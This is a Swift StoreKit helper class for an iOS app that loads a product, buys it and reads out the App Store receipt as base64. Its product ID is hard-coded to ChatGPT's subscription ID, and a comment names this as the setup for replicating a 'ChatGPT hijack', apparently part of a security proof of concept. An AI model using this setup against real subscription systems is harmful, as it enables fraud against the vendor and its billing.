import StoreKit
import Foundation
import UIKit

final class StoreKitHelper: NSObject, ObservableObject, SKProductsRequestDelegate, SKPaymentTransactionObserver, SKRequestDelegate {
    static let shared = StoreKitHelper()

    /// Product ID — must match what is configured in your App Store Connect IAP.
    /// To replicate the ChatGPT hijack, set this to ChatGPT's productId:
    ///   `oai_chatgpt_plus_1999_1m`
    static let productID = "oai_chatgpt_plus_1999_1m"

    @Published var state: String = "init"
    @Published var productLine: String = "(none)"
    @Published var receiptB64: String = ""
    @Published var receiptLen: Int = 0
    @Published var canBuy: Bool = false

    private var product: SKProduct?
    private var productsRequest: SKProductsRequest?
    private var refreshRequest: SKReceiptRefreshRequest?

    func start() {
        SKPaymentQueue.default().add(self)
        state = "observer added"
        loadExistingReceipt()
    }

    func fetchProduct() {
        state = "fetching..."
        let req = SKProductsRequest(productIdentifiers: [Self.productID])
        req.delegate = self
        productsRequest = req
        req.start()
    }

    // MARK: - SKProductsRequestDelegate

    func productsRequest(_ request: SKProductsRequest, didReceive response: SKProductsResponse) {
        DispatchQueue.main.async {
            if let p = response.products.first {
                self.product = p
                let priceStr: String = {
                    let f = NumberFormatter()
                    f.numberStyle = .currency
                    f.locale = p.priceLocale
                    return f.string(from: p.price) ?? "?"
                }()
                self.productLine = "\(p.productIdentifier) | \(priceStr) | period=\(self.periodStr(p.subscriptionPeriod))"
                self.canBuy = true
                self.state = "ready"
            } else {
                self.productLine = "INVALID: \(response.invalidProductIdentifiers.joined(separator: ","))"
                self.state = "no product matched (check ASC config + paid agreement)"
            }
        }
    }

    func request(_ request: SKRequest, didFailWithError error: Error) {
        DispatchQueue.main.async {
            self.state = "request failed: \(error.localizedDescription)"
        }
    }

    func requestDidFinish(_ request: SKRequest) {
        if request is SKReceiptRefreshRequest {
            DispatchQueue.main.async {
                self.loadExistingReceipt()
                self.state = "receipt refreshed"
            }
        }
    }

    // MARK: - Purchase

    func buy() {
        guard let p = product else { return }
        let payment = SKMutablePayment(product: p)
        payment.applicationUsername = "test-user-1234"  // hash of your test app user id
        SKPaymentQueue.default().add(payment)
        state = "purchasing..."
    }

    func refreshReceipt() {
        let req = SKReceiptRefreshRequest()
        req.delegate = self
        refreshRequest = req
        req.start()
        state = "refreshing receipt..."
    }

    // MARK: - SKPaymentTransactionObserver

    func paymentQueue(_ queue: SKPaymentQueue, updatedTransactions transactions: [SKPaymentTransaction]) {
        for tx in transactions {
            DispatchQueue.main.async {
                self.state = "tx state=\(self.txStateName(tx.transactionState)) pid=\(tx.payment.productIdentifier)"
            }
            switch tx.transactionState {
            case .purchased, .restored:
                loadExistingReceipt()
                SKPaymentQueue.default().finishTransaction(tx)
            case .failed:
                if let e = tx.error {
                    DispatchQueue.main.async {
                        self.state = "tx failed: \(e.localizedDescription)"
                    }
                }
                SKPaymentQueue.default().finishTransaction(tx)
            default: break
            }
        }
    }

    // MARK: - Helpers

    func loadExistingReceipt() {
        guard let url = Bundle.main.appStoreReceiptURL,
              let data = try? Data(contentsOf: url) else {
            DispatchQueue.main.async {
                self.receiptB64 = ""
                self.receiptLen = 0
            }
            return
        }
        DispatchQueue.main.async {
            self.receiptLen = data.count
            self.receiptB64 = data.base64EncodedString()
        }
    }

    private func periodStr(_ period: SKProductSubscriptionPeriod?) -> String {
        guard let p = period else { return "(non-sub)" }
        let unit: String
        switch p.unit {
        case .day: unit = "D"
        case .week: unit = "W"
        case .month: unit = "M"
        case .year: unit = "Y"
        @unknown default: unit = "?"
        }
        return "\(p.numberOfUnits)\(unit)"
    }

    private func txStateName(_ s: SKPaymentTransactionState) -> String {
        switch s {
        case .purchasing: return "purchasing"
        case .purchased: return "purchased"
        case .failed: return "failed"
        case .restored: return "restored"
        case .deferred: return "deferred"
        @unknown default: return "?"
        }
    }
}
